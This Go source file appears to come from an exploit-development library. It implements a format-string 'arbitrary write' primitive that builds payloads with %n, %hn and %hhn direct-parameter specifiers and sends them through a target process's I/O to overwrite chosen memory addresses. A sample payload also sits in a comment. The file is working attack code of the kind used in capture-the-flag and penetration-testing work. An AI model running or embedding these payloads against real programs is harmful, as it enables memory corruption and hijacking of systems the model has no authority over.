package memory

import (
	"bytes"
	"fmt"
)

// %192p%9$n%16197p%10$n
// %192p|%9$n|
type DPAFormatStringWriterConfig struct {
	MaxWrite  int
	DPAConfig DPAFormatStringConfig
}

func NewDPAFormatStringWriterOrExit(config DPAFormatStringWriterConfig) *DPAFormatStringWriter {
	w, err := NewDPAFormatStringWriter(config)
	if err != nil {
		defaultExitFn(fmt.Errorf("failed to create new dpa format string writer - %w", err))
	}
	return w
}

func NewDPAFormatStringWriter(config DPAFormatStringWriterConfig) (*DPAFormatStringWriter, error) {
	if config.MaxWrite <= 0 {
		return nil, fmt.Errorf("maximum write size cannot be less than or equal to zero")
	}

	leakConfig, err := createDPAFormatStringLeakWithLastValueAsArg(dpaLeakSetupConfig{
		dpaConfig: config.DPAConfig,
		builderAndMemAlignedLenFn: func() (formatStringBuilder, int) {
			fmtStrBuilder := formatStringBuilder{
				returnDataDelim:  []byte("|"),
				endOfStringDelim: []byte("foozlefu"),
			}
			buff := bytes.NewBuffer(nil)
			fmtStrBuilder.appendDPAWrite(
				config.MaxWrite,
				config.DPAConfig.MaxNumParams,
				[]byte("aaa"), // This could potentially be 'hhn'.
				buff)
			return fmtStrBuilder, stringLenMemoryAligned(buff.Bytes(), config.DPAConfig.PointerSize)
		},
	})
	if err != nil {
		return nil, err
	}

	return &DPAFormatStringWriter{
		config:     config,
		leakConfig: leakConfig,
	}, nil
}

type DPAFormatStringWriter struct {
	config     DPAFormatStringWriterConfig
	leakConfig *dpaLeakConfig
}

func (o DPAFormatStringWriter) WriteLower4BytesAtOrExit(newLowerBytes int, pointer Pointer) {
	err := o.WriteLower4BytesAt(newLowerBytes, pointer)
	if err != nil {
		defaultExitFn(fmt.Errorf("failed to write %d to %s - %w",
			newLowerBytes, pointer.HexString(), err))
	}
}

func (o DPAFormatStringWriter) WriteLower4BytesAt(newLowerBytes int, pointer Pointer) error {
	str, err := o.Lower4BytesFormatString(newLowerBytes)
	if err != nil {
		return err
	}

	_, err = leakDataWithFormatString(
		o.config.DPAConfig.ProcessIOFn(),
		append(str, pointer.Bytes()...),
		o.leakConfig.builder)
	return err
}

func (o DPAFormatStringWriter) Lower4BytesFormatString(newLowerBytes int) ([]byte, error) {
	adjustedNum, err := o.adjustNumToWrite(newLowerBytes)
	if err != nil {
		return nil, err
	}

	buff := bytes.NewBuffer(nil)
	o.leakConfig.builder.appendDPAWrite(adjustedNum, o.leakConfig.paramNum, []byte{'n'}, buff)
	return o.leakConfig.builder.build(o.leakConfig.alignLen, buff), nil
}

func (o DPAFormatStringWriter) WriteLower2BytesAtOrExit(newLowerBytes int, pointer Pointer) {
	err := o.WriteLower2BytesAt(newLowerBytes, pointer)
	if err != nil {
		defaultExitFn(fmt.Errorf("failed to write %d to %s - %w",
			newLowerBytes, pointer.HexString(), err))
	}
}

func (o DPAFormatStringWriter) WriteLower2BytesAt(newLowerBytes int, pointer Pointer) error {
	str, err := o.Lower2BytesFormatString(newLowerBytes)
	if err != nil {
		return err
	}

	_, err = leakDataWithFormatString(
		o.config.DPAConfig.ProcessIOFn(),
		append(str, pointer.Bytes()...),
		o.leakConfig.builder)
	return err
}

func (o DPAFormatStringWriter) Lower2BytesFormatString(newLowerBytes int) ([]byte, error) {
	adjustedNum, err := o.adjustNumToWrite(newLowerBytes)
	if err != nil {
		return nil, err
	}

	buff := bytes.NewBuffer(nil)
	o.leakConfig.builder.appendDPAWrite(adjustedNum, o.leakConfig.paramNum, []byte{'h', 'n'}, buff)
	return o.leakConfig.builder.build(o.leakConfig.alignLen, buff), nil
}

func (o DPAFormatStringWriter) WriteLowestByteAtOrExit(newLowerByte int, pointer Pointer) {
	err := o.WriteLowestByteAt(newLowerByte, pointer)
	if err != nil {
		defaultExitFn(fmt.Errorf("failed to write %d to %s - %w",
			newLowerByte, pointer.HexString(), err))
	}
}

func (o DPAFormatStringWriter) WriteLowestByteAt(newLowerByte int, pointer Pointer) error {
	str, err := o.LowestByteFormatString(newLowerByte)
	if err != nil {
		return err
	}

	_, err = leakDataWithFormatString(
		o.config.DPAConfig.ProcessIOFn(),
		append(str, pointer.Bytes()...),
		o.leakConfig.builder)
	return err
}

func (o DPAFormatStringWriter) LowestByteFormatString(newLowerByte int) ([]byte, error) {
	adjustedNum, err := o.adjustNumToWrite(newLowerByte)
	if err != nil {
		return nil, err
	}

	buff := bytes.NewBuffer(nil)
	o.leakConfig.builder.appendDPAWrite(adjustedNum, o.leakConfig.paramNum, []byte{'h', 'h', 'n'}, buff)
	return o.leakConfig.builder.build(o.leakConfig.alignLen, buff), nil
}

func (o DPAFormatStringWriter) adjustNumToWrite(newValue int) (int, error) {
	if newValue <= 0 {
		return 0, fmt.Errorf("the specified write size of %d cannot be less than or equal to 0", newValue)
	}

	if newValue > o.config.MaxWrite {
		return 0, fmt.Errorf("the specified write size of %d cannot be greater than the configured max of %d",
			newValue, o.config.MaxWrite)
	}

	return newValue-len(o.leakConfig.builder.returnDataDelim), nil
}
